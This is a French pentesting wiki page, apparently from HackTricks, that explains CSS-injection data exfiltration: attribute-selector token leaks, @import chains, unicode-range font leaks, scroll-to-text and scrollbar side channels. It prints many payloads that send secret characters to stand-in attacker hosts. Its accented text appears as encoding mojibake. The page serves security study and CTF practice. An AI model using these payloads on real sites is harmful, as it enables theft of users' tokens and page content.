# CSS Injection

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}


## CSS Injection

### S√©lecteur d'attribut

Les s√©lecteurs CSS sont con√ßus pour correspondre aux valeurs des attributs `name` et `value` d'un √©l√©ment `input`. Si l'attribut de valeur de l'√©l√©ment d'entr√©e commence par un caract√®re sp√©cifique, une ressource externe pr√©d√©finie est charg√©e :
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
Cependant, cette approche rencontre une limitation lorsqu'il s'agit d'√©l√©ments d'entr√©e cach√©s (`type="hidden"`) car les √©l√©ments cach√©s ne chargent pas les arri√®re-plans.

#### Contournement pour les √©l√©ments cach√©s

Pour contourner cette limitation, vous pouvez cibler un √©l√©ment fr√®re suivant en utilisant le combinatoire de fr√®res g√©n√©raux `~`. La r√®gle CSS s'applique alors √† tous les fr√®res suivant l'√©l√©ment d'entr√©e cach√©, provoquant le chargement de l'image d'arri√®re-plan :
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
Un exemple pratique d'exploitation de cette technique est d√©taill√© dans l'extrait de code fourni. Vous pouvez le voir [ici](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### Pr√©requis pour l'injection CSS

Pour que la technique d'injection CSS soit efficace, certaines conditions doivent √™tre remplies :

1. **Longueur de la charge utile** : Le vecteur d'injection CSS doit prendre en charge des charges utiles suffisamment longues pour accueillir les s√©lecteurs con√ßus.
2. **R√©√©valuation CSS** : Vous devez avoir la capacit√© d'encadrer la page, ce qui est n√©cessaire pour d√©clencher la r√©√©valuation du CSS avec des charges utiles nouvellement g√©n√©r√©es.
3. **Ressources externes** : La technique suppose la capacit√© d'utiliser des images h√©berg√©es √† l'ext√©rieur. Cela peut √™tre restreint par la politique de s√©curit√© de contenu (CSP) du site.

### S√©lecteur d'attribut aveugle

Comme [**expliqu√© dans ce post**](https://portswigger.net/research/blind-css-exfiltration), il est possible de combiner les s√©lecteurs **`:has`** et **`:not`** pour identifier du contenu m√™me √† partir d'√©l√©ments aveugles. Cela est tr√®s utile lorsque vous n'avez aucune id√©e de ce qui se trouve √† l'int√©rieur de la page web chargeant l'injection CSS.\
Il est √©galement possible d'utiliser ces s√©lecteurs pour extraire des informations de plusieurs blocs du m√™me type comme dans :
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
Combiner cela avec la technique **@import** suivante permet d'exfiltrer beaucoup d'**info en utilisant l'injection CSS depuis des pages aveugles avec** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

La technique pr√©c√©dente a quelques inconv√©nients, v√©rifiez les pr√©requis. Vous devez soit √™tre capable de **envoyer plusieurs liens √† la victime**, soit √™tre capable de **iframe la page vuln√©rable √† l'injection CSS**.

Cependant, il existe une autre technique astucieuse qui utilise **CSS `@import`** pour am√©liorer la qualit√© de la technique.

Ceci a √©t√© d'abord montr√© par [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) et cela fonctionne comme suit :

Au lieu de charger la m√™me page encore et encore avec des dizaines de charges utiles diff√©rentes √† chaque fois (comme dans la pr√©c√©dente), nous allons **charger la page juste une fois et juste avec un import vers le serveur de l'attaquant** (c'est la charge utile √† envoyer √† la victime) :
```css
@import url('//attacker.com:5001/start?');
```
1. L'importation va **recevoir un script CSS** des attaquants et le **navigateur va le charger**.
2. La premi√®re partie du script CSS que l'attaquant va envoyer est **un autre `@import` vers le serveur des attaquants √† nouveau.**
1. Le serveur des attaquants ne r√©pondra pas encore √† cette demande, car nous voulons fuir quelques caract√®res et ensuite r√©pondre √† cette importation avec la charge utile pour fuir les suivants.
3. La deuxi√®me et plus grande partie de la charge utile va √™tre une **charge utile de fuite de s√©lecteur d'attribut**
1. Cela enverra au serveur des attaquants le **premier caract√®re du secret et le dernier.**
4. Une fois que le serveur des attaquants a re√ßu le **premier et le dernier caract√®re du secret**, il va **r√©pondre √† l'importation demand√©e √† l'√©tape 2**.
1. La r√©ponse va √™tre exactement la m√™me que les **√©tapes 2, 3 et 4**, mais cette fois-ci, elle va essayer de **trouver le deuxi√®me caract√®re du secret et ensuite l'avant-dernier**.

L'attaquant va **suivre cette boucle jusqu'√† ce qu'il parvienne √† fuir compl√®tement le secret**.

Vous pouvez trouver le [**code original de Pepe Vila pour exploiter cela ici**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) ou vous pouvez trouver presque le [**m√™me code mais comment√© ici**.](./#css-injection)

{% hint style="info" %}
Le script va essayer de d√©couvrir 2 caract√®res √† chaque fois (du d√©but et de la fin) car le s√©lecteur d'attribut permet de faire des choses comme :
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
Cela permet au script de leak le secret plus rapidement.  
{% endhint %}

{% hint style="warning" %}
Parfois, le script **ne d√©tecte pas correctement que le pr√©fixe + suffixe d√©couvert est d√©j√† le drapeau complet** et il continuera en avant (dans le pr√©fixe) et en arri√®re (dans le suffixe) et √† un certain moment, il se bloquera.\
Pas de souci, v√©rifiez simplement la **sortie** car **vous pouvez y voir le drapeau**.
{% endhint %}

### Autres s√©lecteurs

Autres fa√ßons d'acc√©der aux parties du DOM avec **CSS selectors** :

* **`.class-to-search:nth-child(2)`** : Cela recherchera le deuxi√®me √©l√©ment avec la classe "class-to-search" dans le DOM.
*   **`:empty`** s√©lecteur : Utilis√© par exemple dans [**ce writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### XS-Search bas√© sur les erreurs

**R√©f√©rence :** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

L'intention g√©n√©rale est de **utiliser une police personnalis√©e d'un point de terminaison contr√¥l√©** et de s'assurer que **le texte (dans ce cas, 'A') est affich√© avec cette police uniquement si la ressource sp√©cifi√©e (`favicon.ico`) ne peut pas √™tre charg√©e**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Utilisation de police personnalis√©e** :
- Une police personnalis√©e est d√©finie √† l'aide de la r√®gle `@font-face` dans une balise `<style>` dans la section `<head>`.
- La police est nomm√©e `poc` et est r√©cup√©r√©e √† partir d'un point de terminaison externe (`http://attacker.com/?leak`).
- La propri√©t√© `unicode-range` est d√©finie sur `U+0041`, ciblant le caract√®re Unicode sp√©cifique 'A'.

2. **√âl√©ment Object avec texte de secours** :
- Un √©l√©ment `<object>` avec `id="poc0"` est cr√©√© dans la section `<body>`. Cet √©l√©ment essaie de charger une ressource depuis `http://192.168.0.1/favicon.ico`.
- La `font-family` pour cet √©l√©ment est d√©finie sur `'poc'`, comme d√©fini dans la section `<style>`.
- Si la ressource (`favicon.ico`) √©choue √† se charger, le contenu de secours (la lettre 'A') √† l'int√©rieur de la balise `<object>` est affich√©.
- Le contenu de secours ('A') sera rendu en utilisant la police personnalis√©e `poc` si la ressource externe ne peut pas √™tre charg√©e.

### Stylisation du fragment de texte d√©filant

La **pseudo-classe `:target`** est utilis√©e pour s√©lectionner un √©l√©ment cibl√© par un **fragment d'URL**, comme sp√©cifi√© dans la [sp√©cification des s√©lecteurs CSS niveau 4](https://drafts.csswg.org/selectors-4/#the-target-pseudo). Il est crucial de comprendre que `::target-text` ne correspond √† aucun √©l√©ment √† moins que le texte ne soit explicitement cibl√© par le fragment.

Une pr√©occupation de s√©curit√© surgit lorsque des attaquants exploitent la fonctionnalit√© **Scroll-to-text**, leur permettant de confirmer la pr√©sence d'un texte sp√©cifique sur une page web en chargeant une ressource depuis leur serveur via une injection HTML. La m√©thode consiste √† injecter une r√®gle CSS comme ceci :
```css
:target::before { content : url(target.png) }
```
Dans de tels sc√©narios, si le texte "Administrator" est pr√©sent sur la page, la ressource `target.png` est demand√©e au serveur, indiquant la pr√©sence du texte. Une instance de cette attaque peut √™tre ex√©cut√©e via une URL sp√©cialement con√ßue qui int√®gre le CSS inject√© avec un fragment Scroll-to-text :
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Ici, l'attaque manipule l'injection HTML pour transmettre le code CSS, visant le texte sp√©cifique "Administrator" via le fragment Scroll-to-text (`#:~:text=Administrator`). Si le texte est trouv√©, la ressource indiqu√©e est charg√©e, signalant involontairement sa pr√©sence √† l'attaquant.

Pour l'att√©nuation, les points suivants doivent √™tre not√©s :

1. **Correspondance STTF Contraignante** : Le fragment Scroll-to-text (STTF) est con√ßu pour correspondre uniquement √† des mots ou des phrases, limitant ainsi sa capacit√© √† divulguer des secrets ou des jetons arbitraires.
2. **Restriction aux Contextes de Navigation de Niveau Sup√©rieur** : Le STTF fonctionne uniquement dans des contextes de navigation de niveau sup√©rieur et ne fonctionne pas dans les iframes, rendant toute tentative d'exploitation plus visible pour l'utilisateur.
3. **N√©cessit√© d'une Activation par l'Utilisateur** : Le STTF n√©cessite un geste d'activation par l'utilisateur pour fonctionner, ce qui signifie que les exploitations ne sont possibles que par des navigations initi√©es par l'utilisateur. Cette exigence att√©nue consid√©rablement le risque que des attaques soient automatis√©es sans interaction de l'utilisateur. N√©anmoins, l'auteur du blog souligne des conditions sp√©cifiques et des contournements (par exemple, l'ing√©nierie sociale, l'interaction avec des extensions de navigateur courantes) qui pourraient faciliter l'automatisation de l'attaque.

La connaissance de ces m√©canismes et des vuln√©rabilit√©s potentielles est essentielle pour maintenir la s√©curit√© web et se prot√©ger contre de telles tactiques d'exploitation.

Pour plus d'informations, consultez le rapport original : [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Vous pouvez consulter un [**exploit utilisant cette technique pour un CTF ici**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Vous pouvez sp√©cifier **des polices externes pour des valeurs unicode sp√©cifiques** qui ne seront **rassembl√©es que si ces valeurs unicode sont pr√©sentes** dans la page. Par exemple :
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
Lorsque vous acc√©dez √† cette page, Chrome et Firefox r√©cup√®rent "?A" et "?B" car le n≈ìud de texte de sensitive-information contient les caract√®res "A" et "B". Mais Chrome et Firefox ne r√©cup√®rent pas "?C" car il ne contient pas "C". Cela signifie que nous avons pu lire "A" et "B".

### Exfiltration de n≈ìud de texte (I) : ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**R√©f√©rence :** [Wykradanie danych w ≈õwietnym stylu ‚Äì czyli jak wykorzystaƒá CSS-y do atak√≥w na webaplikacjƒô](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

La technique d√©crite implique l'extraction de texte d'un n≈ìud en exploitant les ligatures de police et en surveillant les changements de largeur. Le processus implique plusieurs √©tapes :

1. **Cr√©ation de polices personnalis√©es** :
- Des polices SVG sont cr√©√©es avec des glyphes ayant un attribut `horiz-adv-x`, qui d√©finit une grande largeur pour un glyphe repr√©sentant une s√©quence de deux caract√®res.
- Exemple de glyphe SVG : `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, o√π "XY" d√©signe une s√©quence de deux caract√®res.
- Ces polices sont ensuite converties au format woff √† l'aide de fontforge.

2. **D√©tection des changements de largeur** :
- CSS est utilis√© pour s'assurer que le texte ne se renvoie pas (`white-space: nowrap`) et pour personnaliser le style de la barre de d√©filement.
- L'apparition d'une barre de d√©filement horizontale, stylis√©e de mani√®re distincte, agit comme un indicateur (oracle) qu'une ligature sp√©cifique, et donc une s√©quence de caract√®res sp√©cifique, est pr√©sente dans le texte.
- Le CSS impliqu√© :
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **Processus d'exploitation** :
- **√âtape 1** : Des polices sont cr√©√©es pour des paires de caract√®res avec une largeur substantielle.
- **√âtape 2** : Un truc bas√© sur la barre de d√©filement est utilis√© pour d√©tecter quand le glyphe de grande largeur (ligature pour une paire de caract√®res) est rendu, indiquant la pr√©sence de la s√©quence de caract√®res.
- **√âtape 3** : Lors de la d√©tection d'une ligature, de nouveaux glyphes repr√©sentant des s√©quences de trois caract√®res sont g√©n√©r√©s, incorporant la paire d√©tect√©e et ajoutant un caract√®re pr√©c√©dent ou suivant.
- **√âtape 4** : La d√©tection de la ligature de trois caract√®res est effectu√©e.
- **√âtape 5** : Le processus se r√©p√®te, r√©v√©lant progressivement tout le texte.

4. **Optimisation** :
- La m√©thode d'initialisation actuelle utilisant `<meta refresh=...` n'est pas optimale.
- Une approche plus efficace pourrait impliquer le truc CSS `@import`, am√©liorant les performances de l'exploitation.

### Exfiltration de n≈ìud de texte (II) : fuite du charset avec une police par d√©faut (ne n√©cessitant pas d'actifs externes) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**R√©f√©rence :** [PoC utilisant Comic Sans par @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Ce truc a √©t√© publi√© dans ce [**fil Slackers**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/). Le charset utilis√© dans un n≈ìud de texte peut √™tre divulgu√© **en utilisant les polices par d√©faut** install√©es dans le navigateur : aucune police externe -ou personnalis√©e- n'est n√©cessaire.

Le concept tourne autour de l'utilisation d'une animation pour √©largir progressivement la largeur d'un `div`, permettant √† un caract√®re √† la fois de passer de la partie 'suffixe' du texte √† la partie 'pr√©fixe'. Ce processus divise efficacement le texte en deux sections :

1. **Pr√©fixe** : La ligne initiale.
2. **Suffixe** : La ou les lignes suivantes.

Les √©tapes de transition des caract√®res appara√Ætraient comme suit :

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


Au cours de cette transition, le **truc unicode-range** est utilis√© pour identifier chaque nouveau caract√®re √† mesure qu'il rejoint le pr√©fixe. Cela est r√©alis√© en changeant la police en Comic Sans, qui est notablement plus haute que la police par d√©faut, d√©clenchant ainsi une barre de d√©filement verticale. L'apparition de cette barre de d√©filement r√©v√®le indirectement la pr√©sence d'un nouveau caract√®re dans le pr√©fixe.

Bien que cette m√©thode permette la d√©tection de caract√®res uniques √† mesure qu'ils apparaissent, elle ne pr√©cise pas quel caract√®re est r√©p√©t√©, seulement qu'une r√©p√©tition a eu lieu.

{% hint style="info" %}
Fondamentalement, le **unicode-range est utilis√© pour d√©tecter un char**, mais comme nous ne voulons pas charger une police externe, nous devons trouver un autre moyen.\
Lorsque le **char** est **trouv√©**, il est **donn√©** √† la **police Comic Sans pr√©install√©e**, qui **rend** le char **plus grand** et **d√©clenche une barre de d√©filement** qui **fuit le char trouv√©**.
{% endhint %}

V√©rifiez le code extrait du PoC :
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### Exfiltration de n≈ìud de texte (III) : fuite du charset avec une police par d√©faut en cachant des √©l√©ments (ne n√©cessitant pas d'actifs externes) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**R√©f√©rence :** Cela est mentionn√© comme [une solution infructueuse dans ce rapport](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Ce cas est tr√®s similaire au pr√©c√©dent, cependant, dans ce cas, l'objectif de rendre des **chars sp√©cifiques plus grands que d'autres est de cacher quelque chose** comme un bouton pour ne pas √™tre press√© par le bot ou une image qui ne sera pas charg√©e. Ainsi, nous pourrions mesurer l'action (ou l'absence d'action) et savoir si un char sp√©cifique est pr√©sent dans le texte.

### Exfiltration de n≈ìud de texte (III) : fuite du charset par timing de cache (ne n√©cessitant pas d'actifs externes) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**R√©f√©rence :** Cela est mentionn√© comme [une solution infructueuse dans ce rapport](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Dans ce cas, nous pourrions essayer de fuir si un char est dans le texte en chargeant une police factice de la m√™me origine :
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
Si une correspondance est trouv√©e, la **police sera charg√©e depuis `/static/bootstrap.min.css?q=1`**. Bien qu'elle ne se charge pas avec succ√®s, le **navigateur devrait la mettre en cache**, et m√™me s'il n'y a pas de cache, il existe un m√©canisme de **304 non modifi√©**, donc la **r√©ponse devrait √™tre plus rapide** que d'autres choses.

Cependant, si la diff√©rence de temps entre la r√©ponse mise en cache et celle non mise en cache n'est pas suffisamment grande, cela ne sera pas utile. Par exemple, l'auteur a mentionn√© : Cependant, apr√®s des tests, j'ai constat√© que le premier probl√®me est que la vitesse n'est pas tr√®s diff√©rente, et le deuxi√®me probl√®me est que le bot utilise le drapeau `disk-cache-size=1`, ce qui est vraiment r√©fl√©chi.

### Exfiltration de n≈ìud texte (III) : fuite du charset en chronom√©trant le chargement de centaines de "polices" locales (ne n√©cessitant pas d'actifs externes) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**R√©f√©rence :** Cela est mentionn√© comme [une solution infructueuse dans cet article](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

Dans ce cas, vous pouvez indiquer **CSS pour charger des centaines de fausses polices** de la m√™me origine lorsqu'une correspondance se produit. De cette fa√ßon, vous pouvez **mesurer le temps** qu'il faut et d√©couvrir si un caract√®re appara√Æt ou non avec quelque chose comme :
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
Et le code du bot ressemble √† ceci :
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
Donc, si la police ne correspond pas, le temps de r√©ponse lors de la visite du bot devrait √™tre d'environ 30 secondes. Cependant, s'il y a une correspondance de police, plusieurs requ√™tes seront envoy√©es pour r√©cup√©rer la police, ce qui entra√Ænera une activit√© continue sur le r√©seau. En cons√©quence, il faudra plus de temps pour satisfaire la condition d'arr√™t et recevoir la r√©ponse. Par cons√©quent, le temps de r√©ponse peut √™tre utilis√© comme un indicateur pour d√©terminer s'il y a une correspondance de police.

## R√©f√©rences

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
